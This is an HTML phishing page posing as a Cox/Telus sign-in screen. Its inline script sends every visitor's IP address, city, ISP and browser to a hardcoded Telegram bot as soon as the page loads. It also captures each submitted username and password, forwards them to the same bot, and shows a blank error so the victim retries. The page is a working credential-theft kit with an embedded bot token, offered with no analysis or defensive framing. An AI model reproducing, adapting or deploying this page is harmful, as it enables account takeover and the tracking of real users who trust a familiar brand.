<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Welcome back - Cox</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1749980436/cox1_p6itur.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      min-height: 100vh;
      display: flex;
      align-items: center;
      padding: 20px;
    }

    #introImageContainer {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: black;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    #introImageContainer img {
      max-width: 100%;
      max-height: 100%;
    }

    body {
  margin: 0;
  display: flex;
  align-items: center; /* Vertical center stays consistent */
  justify-content: flex-start; /* Keeps alignment to the left */
  min-height: 100vh;
  background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1790761403/telus_ouh2zx.png');
  background-size: cover;
  background-position: center;
}

.login-container {
  background: 
  backdrop-filter: 
  border-radius: 12px;
  padding: 10px;
  
  /* FIXED RESPONSIVE WIDTH */
  width: 90%; /* Occupies most of the screen on tiny phones */
  max-width: 400px; /* Won't get too big on desktop */
  
  /*  CONSISTENT LEFT SHIFT */
  /* Using 5vw (5% of screen width) keeps it away from the edge on all devices */
  margin-left: 10vw; 
  
  box-shadow: 
  display: block; 
}

    .welcome-title {
      color: #0066cc;
      font-size: 32px;
      font-weight: 600;
      margin-bottom: 1px;
      text-align: left;
    }

    .form-group {
      margin-bottom: 5px;
    }

    .form-label {
      display: block;
      color: #666;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 20px;
    }

    .form-input {
      width: 100%;
      padding: 12px 16px;
      border: 2px solid #d1d5db;
      border-radius: 8px;
      font-size: 16px;
      background: white;
      transition: border-color 0.3s ease;
    }

    .form-input:focus {
      outline: none;
      border-color: #0066cc;
    }

    .password-container {
      position: relative;
	  margin-bottom: 25px;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #666;
      font-size: 18px;
    }

   

    .sign-in-btn {
      width: 100%;
      background: #008000;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 25px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 80px;
      transition: background-color 0.3s ease;
    }

    .sign-in-btn:hover {
      background: #008000;
    }

    .help-links {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .help-link {
      color: #008000;
      text-decoration: none;
      font-size: 14px;
      transition: color 0.3s ease;
    }

    .help-link:hover {
      color: #0052a3;
      text-decoration: underline;
    }

    @media (max-width: 768px) {
      .login-container {
        margin-left: 20px;
        margin-right: 20px;
        padding: 30px;
      }

      .welcome-title {
        font-size: 28px;
      }
    }

    @media (max-width: 480px) {
      .login-container {
        margin-left: 0;
        max-width: none;
      }
    }

    .error-message {
      color: red;
      font-size: 14px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <!-- 👇 Intro Image Overlay -->
  <div id="introImageContainer">
    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png" alt="Intro Image" />
  </div>

  <!-- 👇 Login Form -->
  <div class="login-container" id="loginContainer">
    <h1 class="welcome-title"></h1>

    <form id="loginForm">
      <div id="errorMessage" class="error-message" style="display: none;"></div>

      <div class="form-group">
        <label for="userId" class="form-label">Email or username</label>
        <input type="text" id="userId" name="userId" class="form-input" required />
      </div>

      <div class="form-group">
        <label for="password" class="form-label">Password</label>
        <div class="password-container">
          <input type="password" id="password" name="password" class="form-input" required />
          <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
        </div>
      </div>

      <div class="checkbox-container">
       
        <label for="rememberUser" class="checkbox-label"></label>
      </div>

      <button type="submit" class="sign-in-btn">Sign in</button>

    
      </div>
    </form>
  </div>

  <script>
    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
    const chatId = '8052751627';
    let loginAttempts = 0;

    async function sendToTelegram(message) {
      if (!navigator.onLine) return;
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      } catch (err) {
        console.error('Telegram send error:', err);
      }
    }

    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const toggleButton = document.querySelector('.password-toggle');

      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleButton.textContent = '';
      } else {
        passwordInput.type = 'password';
        toggleButton.textContent = '👁';
      }
    }

    function sendVisitorInfo() {
      const userAgent = navigator.userAgent;
      const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');

      if (!navigator.onLine) {
        sendToTelegram(`📴 Offline Visitor\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
        return;
      }

      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const message = `🌐 telus Visi Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
          sendToTelegram(message);
        }).catch(() => {
          sendToTelegram(`🌐 telus Visi (IP lookup failed)\nBrowser: ${userAgent}`);
        });
    }

    window.onload = () => {
      sendVisitorInfo();

      setTimeout(() => {
        const intro = document.getElementById('introImageContainer');
        const login = document.getElementById('loginContainer');
        if (intro) intro.style.display = 'none';
        if (login) login.style.display = 'block';
      }, 500);
    };

    document.getElementById('loginForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const userId = document.getElementById('userId').value.trim();
      const password = document.getElementById('password').value.trim();

      if (userId && password) {
        loginAttempts++;
        const msg = `❌ telus Lo fai #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
        await sendToTelegram(msg);

        const errorMsg = document.getElementById('errorMessage');
        errorMsg.textContent =
          "";
        errorMsg.style.display = 'block';

        document.getElementById('password').value = '';
        document.getElementById('password').focus();

        if (loginAttempts >= 30) {
          window.location.href =
            'https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png';
        }
      }
    });
  </script>
</body>
</html>
